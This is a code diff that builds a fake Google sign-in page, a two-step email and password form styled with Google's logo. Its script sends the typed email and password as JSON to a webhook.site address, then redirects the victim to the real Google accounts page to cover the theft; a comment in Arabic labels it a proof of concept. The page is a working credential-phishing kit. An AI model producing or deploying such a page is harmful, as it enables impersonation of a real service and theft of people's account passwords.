@@ -62,4 +62,45 @@
 <body>
   <div class="container">
     <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo" class="logo">
-    <form
+    <form onsubmit="return nextStep(event)">
+      <div class="step1">
+        <h1>Sign in</h1>
+        <input type="email" id="email" placeholder="Email or phone" required>
+        <button type="submit">Next</button>
+      </div>
+      <div class="step2">
+        <h1>Welcome</h1>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <button type="button" onclick="sendData()">Sign In</button>
+      </div>
+      <small>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></small>
+    </form>
+  </div>
+
+  <script>
+    function nextStep(e) {
+      e.preventDefault();
+      document.querySelector('.step1').style.display = 'none';
+      document.querySelector('.step2').style.display = 'block';
+      return false;
+    }
+
+    function sendData() {
+      const email = document.getElementById('email').value;
+      const pass = document.getElementById('password').value;
+
+      // إرسال البيانات لWebhook (POC فقط، مش حقيقي)
+      fetch("https://webhook.site/YOUR_WEBHOOK_ID", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({email: email, password: pass})
+      });
+
+      alert("POC Submitted: " + email + " / " + pass);
+      window.location.href = "https://accounts.google.com"; // Fake finish redirect
+    }
+  </script>
+</body>
+</html>
